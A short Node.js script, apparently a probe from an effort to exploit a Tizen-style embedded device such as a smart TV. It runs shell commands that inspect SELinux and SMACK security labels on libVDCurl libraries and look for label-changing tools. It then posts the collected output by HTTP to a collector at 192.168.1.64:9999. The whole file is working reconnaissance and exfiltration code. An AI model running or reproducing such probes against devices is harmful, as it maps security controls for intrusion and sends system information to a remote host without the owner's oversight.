"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 2500); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.labels = sh("ls -laZ /usr/lib/libVDCurl.so.0.9 /opt/acr-ca/libVDCurl.so.0.9 2>&1");
out.tools = sh("which chsmack setfattr attr getfattr 2>&1; ls /usr/bin/chsmack /usr/sbin/chsmack 2>&1");
out.chsmack = sh("chsmack -a /usr/lib/libVDCurl.so.0.9 2>&1; chsmack -a /opt/acr-ca/libVDCurl.so.0.9 2>&1");
post("/smack_probe", out);
